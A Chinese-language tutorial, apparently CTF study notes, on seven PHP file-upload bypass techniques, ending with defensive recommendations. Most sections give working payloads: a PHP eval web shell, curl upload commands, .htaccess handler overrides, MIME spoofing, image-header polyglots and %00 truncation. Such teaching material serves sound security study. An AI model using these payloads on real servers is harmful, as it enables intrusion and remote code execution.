---
title: "文件上传绕过技法全解：从无验证到双写后缀的七种攻击面"
date: 2026-06-05T00:00:00+08:00
draft: false
tags: ["CTF", "Web安全", "文件上传", "绕过", "Upload-Labs"]
categories: ["技术笔记"]
---

## 一、前言

文件上传漏洞是 Web 安全中最常见的高危漏洞之一。实际环境中，服务端往往不会「完全不设防」，而是部署了多层校验。本题图梳理了文件上传从「无验证」到「双写后缀」的完整攻击链路，本文将逐一拆解图中高亮的 **七种绕过技法**，配合真实代码和 Payload，形成可落地的利用手册。

---

## 二、无验证

### 2.1 漏洞特征

服务端对用户上传的文件**不做任何校验**，直接保存到可访问目录。

```php
$target = "upload/" . $_FILES["file"]["name"];
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
```

### 2.2 利用方式

直接上传 PHP 一句话木马即可：

```php
<?php eval($_POST['cmd']); ?>
```

访问 `http://target/upload/shell.php`，蚁剑或 curl 直接连接。

### 2.3 为什么还存在

常见于：
- 后台管理系统的「临时上传」功能
- 内网测试环境未清理的接口
- 前后端分离架构中，前端直传 OSS 但回显了内网地址

---

## 三、前端验证绕过

### 3.1 漏洞特征

校验逻辑只写在浏览器端 JavaScript 中，后端 PHP 未做任何校验：

```javascript
function checkFile() {
    var allow_ext = ".jpg|.png|.gif";
    var ext = file.substring(file.lastIndexOf("."));
    if (allow_ext.indexOf(ext + "|") == -1) {
        alert("该文件不允许上传");
        return false;
    }
}
```

### 3.2 绕过方式

**方法一：禁用浏览器 JavaScript**

Chrome DevTools → Settings → Debugger → Disable JavaScript。

**方法二：Burp 抓包修改**

先选择合法的 `.jpg` 文件通过前端校验，Burp 拦截后将文件名改为 `shell.php`。

**方法三：curl 直接发包**

完全不经过浏览器，绕过一切前端校验：

```bash
curl -X POST \
  -F "upload_file=@shell.php" \
  -F "submit=上传" \
  "http://target/upload.php"
```

### 3.3 核心认知

前端校验只能提升用户体验，**绝对不可作为安全防线**。所有安全校验必须在服务端完成。

---

## 四、.htaccess 解析绕过

### 4.1 漏洞特征

服务端检查后缀名，禁止上传 `.php`，但**允许上传 `.htaccess`**，且上传目录在 Apache 下运行。

### 4.2 利用原理

Apache 的 `.htaccess` 文件可以覆盖当前目录的配置。通过上传自定义的 `.htaccess`，可以让 Apache 把任意后缀当作 PHP 执行：

```apache
# 将 .jpg 文件解析为 PHP
AddType application/x-httpd-php .jpg

# 或者更激进：所有文件都按 PHP 解析
SetHandler application/x-httpd-php
```

### 4.3 完整攻击链

1. **上传 `.htaccess`**：

```apache
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

2. **上传 `shell.jpg`**（内容实为 PHP 木马）：

```php
<?php eval($_POST['cmd']); ?>
```

3. **访问 `http://target/upload/shell.jpg`**，Apache 会将其当作 PHP 执行。

### 4.4 限制条件

- 目标必须是 **Apache**（Nginx/IIS 不支持 `.htaccess`）
- 主配置中 `AllowOverride` 不能为 `None`
- 部分环境会禁止 `.htaccess` 上传（需配合 `.htaccess.txt` 再重命名等技巧）

---

## 五、MIME 绕过

### 5.1 漏洞特征

服务端校验 `$_FILES['file']['type']`（即 HTTP 请求头中的 `Content-Type`），但不校验实际文件后缀或内容：

```php
if ($_FILES['file']['type'] != "image/jpeg") {
    die("只允许上传图片");
}
```

### 5.2 利用方式

`Content-Type` 是客户端发送的 HTTP 头，**完全可控**。Burp 拦截后修改即可：

```http
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg            <-- 把 application/x-php 改成 image/jpeg

<?php eval($_POST['cmd']); ?>
```

### 5.3 批量 fuzz

如果不确定服务端白名单里有哪些 MIME 类型，可以批量尝试：

```bash
for type in "image/jpeg" "image/png" "image/gif" "application/octet-stream"; do
    curl -F "file=@shell.php;type=$type" \
         -F "submit=上传" \
         http://target/upload.php
done
```

---

## 六、文件头检查绕过

### 6.1 漏洞特征

服务端读取文件开头的 Magic Bytes 判断文件类型：

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $tmp_file);
// 或者使用 getimagesize() / exif_imagetype()
```

常见文件头：

| 文件类型 | Magic Bytes | 十六进制 |
|---------|-------------|---------|
| JPEG | `FF D8 FF` | `FFD8FF` |
| PNG | `89 50 4E 47` | `89504E47` |
| GIF | `GIF89a` / `GIF87a` | `47494638` |
| BMP | `BM` | `424D` |

### 6.2 绕过方式：图片马

将 PHP 代码附加在图片文件头之后，使文件**既是合法图片，又包含可执行代码**。

**方法一：命令行拼接**

```bash
# 复制一张正常图片
convert -size 1x1 xc:white empty.jpg

# 拼接木马
cat empty.jpg shell.php > shell.jpg
```

**方法二：手写最小 GIF 头**

GIF 的文件头最简短，可以直接手写：

```php
GIF89a
<?php eval($_REQUEST['cmd']); ?>
```

保存为 `shell.jpg` 上传。`getimagesize()` 看到 `GIF89a` 就认为是合法图片，但如果在 PHP 环境中被访问，仍会执行其中的 PHP 代码（需配合文件包含或解析漏洞）。

**方法三：使用工具插入注释**

```bash
# 使用 exiftool 在 JPG 的注释段插入代码
exiftool -Comment='<?php eval($_POST[cmd]); ?>' normal.jpg -o shell.jpg
```

### 6.3 配合其他漏洞

单纯的图片马通常**无法直接被访问执行**，因为后缀是 `.jpg`。需要配合：

- **文件包含漏洞**：`include('uploads/shell.jpg')`
- **.htaccess 解析**：上传 `.htaccess` 让 `.jpg` 解析为 PHP
- **Apache 解析漏洞**：`shell.php.jpg` 在某些老版本配置下被解析

---

## 七、00 截断

### 7.1 漏洞特征

在 PHP < 5.3.4 且 `magic_quotes_gpc = Off` 的环境下，字符串中的 `%00`（URL 解码后为 `0x00`）会被当作**字符串结束符**。

漏洞代码通常使用用户可控的路径拼接：

```php
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
$target = "upload/" . md5(time()) . "." . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], $target);
```

如果 `$target` 的生成逻辑中用户可控的部分出现在扩展名之前，就可能截断。

### 7.2 经典场景

**路径可控 + 后缀固定**：

```php
$path = $_GET['path'];          // 用户可控
$target = $path . "/shell.jpg"; // 强制追加后缀
move_uploaded_file($tmp, $target);
```

请求：

```
POST /upload.php?path=uploads/shell.php%00 HTTP/1.1
```

服务端实际保存路径变为 `uploads/shell.php`，`.jpg` 及之后的内容被 `%00` 截断。

### 7.3 Burp 操作步骤

1. 上传正常图片，Burp 拦截
2. 在路径参数处插入 `shell.php%00`：

```http
POST /upload.php?save_path=uploads/shell.php%00 HTTP/1.1
...

Content-Disposition: form-data; name="upload_file"; filename="shell.jpg"
```

3. 放行，文件最终保存为 `uploads/shell.php`

### 7.4 限制条件

- **PHP < 5.3.4**（5.3.4 起修复了 `%00` 截断）
- `magic_quotes_gpc = Off`
- 截断点必须出现在**文件名或路径的拼接处**，且用户可控部分在扩展名之前

---

## 八、双写后缀绕过

### 8.1 漏洞特征

服务端使用**单次字符串替换**过滤危险后缀：

```php
$filename = $_FILES['file']['name'];
$blacklist = ['php', 'php3', 'php4', 'php5', 'phtml'];
foreach ($blacklist as $ext) {
    $filename = str_replace($ext, '', $filename);  // 只替换一次！
}
move_uploaded_file($tmp, "upload/" . $filename);
```

### 8.2 绕过原理

利用替换逻辑的**不对称性**：被替换后的结果恰好组成新的危险后缀。

| 原始文件名 | 替换逻辑 | 最终结果 |
|-----------|---------|---------|
| `shell.pphphp` | 替换 `php` → `` | `shell.php` |
| `shell.php.php` | 替换 `php` → `` | `shell..php`（部分环境仍可解析）|
| `shell.PHP` | 未处理大小写 | `shell.PHP` |

最经典的 Payload：

```
shell.pphphp
```

服务端执行 `str_replace('php', '', 'shell.pphphp')` 后得到 `shell.php`。

### 8.3 变种场景

如果后端代码是：

```php
$filename = str_ireplace('php', '', $filename);  // 不区分大小写，但仍只替换一次
```

仍然可以使用双写：`shell.pphphp`

如果替换了 `.`（点号），可以尝试：

```
shell.phpjpg
# 或者利用路径截断等其他技巧
```

---

## 九、防御建议

### 9.1 白名单 > 黑名单

永远不要依赖黑名单。危险后缀无穷无尽：`.php`、`.php3`、`.phtml`、`.phar`、`.htaccess`...

```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    die("文件类型不允许");
}
```

### 9.2 多重校验叠加

单层校验极易被绕过，建议同时校验：

| 校验层 | 方法 | 说明 |
|-------|------|------|
| **后缀白名单** | `pathinfo()` + `in_array()` | 只允许 `.jpg`、`.png` |
| **文件头检测** | `getimagesize()` / `finfo_file()` | 确保是真实图片 |
| **MIME 校验** | `$_FILES['type']` 仅作参考 | 不可单独信任 |
| **二次渲染** | `imagecreatefromjpeg()` | 破坏嵌入的恶意代码 |

### 9.3 重命名 + 隔离存储

```php
$ext = pathinfo($filename, PATHINFO_EXTENSION);
$new_name = md5(uniqid() . time()) . '.' . $ext;
move_uploaded_file($tmp, '/var/uploads/' . $new_name);
```

- 上传目录设置为**不可执行**（Nginx: `location /uploads { deny all; }`）
- 使用独立域名或 OSS 隔离上传文件

### 9.4 禁用危险功能

- 关闭 `AllowOverride`，禁止 `.htaccess`
- 升级 PHP 到 5.4+，避免 `%00` 截断
- 使用 `open_basedir` 限制文件操作范围

---

## 十、总结

| 攻击面 | 核心绕过思路 | 前提条件 |
|--------|------------|---------|
| **无验证** | 直接上传 `.php` | 服务端无任何校验 |
| **前端验证** | 禁用 JS / curl 直接发包 / Burp 改包 | 校验只在浏览器端 |
| **.htaccess** | 上传 `.htaccess` 修改解析规则 | Apache + AllowOverride 开启 |
| **MIME 绕过** | Burp 修改 `Content-Type` | 仅校验 MIME 类型 |
| **文件头检查** | 制作图片马（`GIF89a` + PHP 代码） | 仅校验文件头 |
| **00 截断** | 路径参数插入 `%00` | PHP < 5.3.4 + 路径可控 |
| **双写后缀** | `pphphp` 替换后成为 `php` | 单次 `str_replace` 过滤 |

文件上传漏洞的绕过本质上是**「校验与欺骗」的博弈**。每增加一层校验，攻击面就缩小一分，但单一校验始终存在被绕过的可能。**白名单 + 文件头 + 二次渲染 + 隔离存储**的组合，才是相对稳固的防御方案。
